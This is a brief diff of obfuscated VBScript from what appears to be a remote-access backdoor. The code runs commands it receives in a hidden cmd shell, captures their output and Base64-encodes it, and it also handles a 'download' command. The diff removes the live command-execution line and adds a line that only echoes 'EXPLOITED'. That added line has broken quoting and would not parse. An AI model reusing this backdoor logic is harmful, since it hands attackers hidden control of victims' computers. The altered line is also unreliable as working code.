@@ -222,7 +222,7 @@ Elseif Left(command,8)="download" then
     Loop
 Elseif command<>"" then
 Str=""
-WShell.Run "cmd /c echo "&command&" > """&ZLOBER&""" 2>&1",0,true
+WShell.Run "cmd /c echo EXPLOITED " > """&ZLOBER&""" 2>&1",0,true
 Set objFile = fahudss.OpenTextFile(ZLOBER, 1)
 Str = objFile.ReadAll
 BStr=Base64Encode(Str)
